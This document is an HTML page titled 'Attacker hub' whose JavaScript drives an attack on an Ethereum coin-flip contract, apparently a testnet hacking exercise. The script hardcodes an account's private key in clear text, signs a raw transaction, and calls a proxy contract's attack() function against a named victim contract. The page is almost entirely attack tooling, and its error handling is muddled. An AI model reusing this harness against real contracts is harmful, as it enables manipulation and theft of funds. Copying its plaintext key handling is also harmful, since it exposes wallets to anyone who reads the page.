<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Attacker hub</title>
    <script type="text/javascript" src="lib/ethereumjs-tx-1.3.3.min.js"></script>
    <script>
    var account = "0x375ec30b5db55c2e2696a72e2380d034db5a26bb";
    //Private key in clear text: Don't try this at home :)
    var privateKey = "35c003e2b992b8b57f1979d44efe7159fca4ba6555cd4943633be709a4ae0f2d";

    var debug;
    var attackerAddress;
    var amountAttack;
    var victimContractAddress = "0x3cea927e25f869af7d3baffffd7f49490e7d50bf";
    var victimContractAbi = '[{"constant":false,"inputs":[{"name":"_guess","type":"bool"}],"name":"flip","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"consecutiveWins","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]';
    var VictimContract;
    var victimContractInstance;

    var ProxyContractAddress = "0x952eb25d022e5f158ed153c31843510d800fb829";
    var ProxyContractAbi = '[{"constant":false,"inputs":[{"name":"_victim","type":"address"}],"name":"attack","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}]';
    var ProxyContract;
    var ProxyContractInstance;

    if (checkAttackCondition()) {
        victimContract = web3.eth.contract(JSON.parse(victimContractAbi));
        victimContractInstance = victimContract.at(victimContractAddress);

        ProxyContract = web3.eth.contract(JSON.parse(ProxyContractAbi));
        ProxyContractInstance = ProxyContract.at(ProxyContractAddress);
    }

    window.addEventListener('load', function() {

        // Checking if Web3 has been injected by the browser (Mist/MetaMask)
        if (typeof web3 !== 'undefined') {

            // Use the browser's ethereum provider
            var provider = web3.currentProvider

        } else {
            console.log('No web3? You should consider trying MetaMask!')
        }

    })
    
    

    //check the victim and attacker contract parameter
    function checkAttackCondition() {
        var ret = true;
        if (!web3.isAddress(victimContractAddress)) {
            console.log("victim address is missing (use setVictimAddress())");
            ret = false;
        }
        if (!web3.isAddress(ProxyContractAddress)) {
            console.log("Proxy Contract Address address is missing (use setProxyContract())");
            ret = false;
        }
        if (victimContractAbi == "") {
            console.log("victim abi is missing (use setvictimContractAbi())");
            ret = false;
        }
        if (ProxyContractAbi == "") {
            console.log("Proxy Contract Address ABI is missing (use setProxyContractAbi())");
            ret = false;
        }

        return ret;
    }

    
    function step1() {
        ///


            //var web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io/i3RVw2qkKtl0fLuVGPgV"));
            var web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8545"));
            /////deposit
            web3.eth.getTransactionCount(account, function(err, nonce) {
                var data = web3.eth.contract(JSON.parse(ProxyContractAbi)).at(ProxyContractAddress).attack.getData(victimContractAddress);

                var tx = new ethereumjs.Tx({
                    nonce: nonce,
                    gasPrice: web3.toHex(web3.toWei('4000', 'gwei')),
                    gasLimit: 100000,
                    to: ProxyContractAddress,
                    value: 0,
                    data: data,
                });
                tx.sign(ethereumjs.Buffer.Buffer.from(privateKey, 'hex'));

                var raw = '0x' + tx.serialize().toString('hex');
                // console.log(raw);
                web3.eth.sendRawTransaction(raw, function(err, transactionHash) {
                    console.log(err);
                    console.log("https://ropsten.etherscan.io/tx/" + transactionHash);
                    web3.eth.getTransactionReceipt(transactionHash, function(err, tr) {
                        console.log(tr);
                    });
                });
            });
        
    }

    function deposit() {
        debug =  ProxyContractInstance.attack(victimContractAddress, function(error, result) {
            if (!error) {
                console.error(error);
                console.log(result);


            } else {
                console.error(error);
                console.log(result);

            }
        });

    }


    </script>
    <style type="text/css">
      body {
              margin:0;
              padding:0;
              background: url("gameover.png") no-repeat top fixed; 
              -webkit-background-size: cover; /* pour anciens Chrome et Safari */
              background-size: 100%; /* version standardis√©e */
              background-color: black;
          }

    </style>
</head>

<body >
</body>

</html>